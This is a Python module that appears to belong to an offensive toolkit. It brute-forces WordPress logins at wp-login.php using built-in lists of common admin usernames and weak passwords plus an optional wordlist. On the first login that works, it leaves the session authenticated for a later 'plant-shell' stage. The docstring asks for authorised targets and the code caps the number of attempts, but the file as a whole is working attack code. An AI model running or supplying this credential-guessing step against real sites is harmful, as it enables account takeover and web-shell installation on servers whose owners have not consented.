"""Track B front door — weak-password / credential-stuffing against wp-login.php.

Fully automatable: no victim, no pre-existing account. Tries a small built-in
list of common WordPress logins (plus an optional --wordlist) and, on the first
that authenticates, the session is left logged in for the plant-shell stage.

Safety: a hard attempt cap and password-major ordering. Intended for AUTHORISED
targets — real logins can lock accounts or look like a DoS.
"""
import wp_authshell

COMMON_USERS = ["admin", "administrator", "root", "wpadmin", "webmaster", "test"]
COMMON_PASSWORDS = [
    "admin", "password", "Password1", "Password1!", "admin123", "123456",
    "12345678", "123456789", "root", "changeme", "welcome", "welcome1",
    "letmein", "qwerty", "qwerty123", "P@ssw0rd", "passw0rd", "wordpress",
]


def _pairs(users, passwords, extra_pairs):
    """Yield de-duplicated (user, password) attempts. Explicit pairs first, then
    password-major (a single weak password is found across users before deep
    per-user guessing)."""
    seen = set()
    for pair in (extra_pairs or []):
        if pair not in seen:
            seen.add(pair)
            yield pair
    for pw in passwords:
        for u in users:
            if (u, pw) not in seen:
                seen.add((u, pw))
                yield (u, pw)


def try_credentials(base_url, http, users=None, passwords=None,
                    extra_pairs=None, cap=60, login_fn=None):
    """Return {'username','password','attempts'} for the first working login,
    or None. On success the session (via login_fn) is authenticated. `cap`
    bounds total attempts for lockout/DoS safety."""
    login_fn = login_fn or wp_authshell.login
    users = list(users) if users else list(COMMON_USERS)
    passwords = list(passwords) if passwords else list(COMMON_PASSWORDS)
    attempts = 0
    for u, pw in _pairs(users, passwords, extra_pairs):
        if attempts >= cap:
            break
        attempts += 1
        if login_fn(base_url, http, u, pw):
            return {"username": u, "password": pw, "attempts": attempts}
    return None


def load_wordlist(path):
    """Parse a file into (passwords, pairs). A line containing ':' is a
    user:pass pair; otherwise it's a password. '#' lines and blanks ignored.
    Never raises → ([], []) on any error."""
    passwords, pairs = [], []
    try:
        with open(path) as f:
            for line in f:
                line = line.rstrip("\n")
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    u, pw = line.split(":", 1)
                    pairs.append((u, pw))
                else:
                    passwords.append(line)
    except Exception:
        return [], []
    return passwords, pairs
